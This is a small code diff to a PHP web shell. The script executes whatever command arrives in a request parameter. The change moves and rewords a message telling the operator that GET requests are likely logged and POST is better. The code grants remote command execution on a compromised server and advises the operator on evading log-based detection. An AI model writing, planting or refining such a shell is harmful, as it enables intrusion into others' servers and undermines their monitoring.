@@ -39,14 +39,14 @@ if (isset($_REQUEST[$cmd])) {
    // command on apache logs)
    $command = $_REQUEST[$cmd];
 
+   // warn about noisy get requests
+   if ($_SERVER['REQUEST_METHOD'] == 'GET') {
+      echo 'GET requests are most likely logged, better use POST instead';
+   }
+
    // notify on execution failure
    if (!executeCommand($command)) {
       echo 'The command failed to run';
-   }
-
-   // warn about noisy get commands
-   if ($_SERVER['REQUEST_METHOD'] == 'GET') {
-      echo 'GET requests can get logged, better use POST instead';
    }
 
    die();
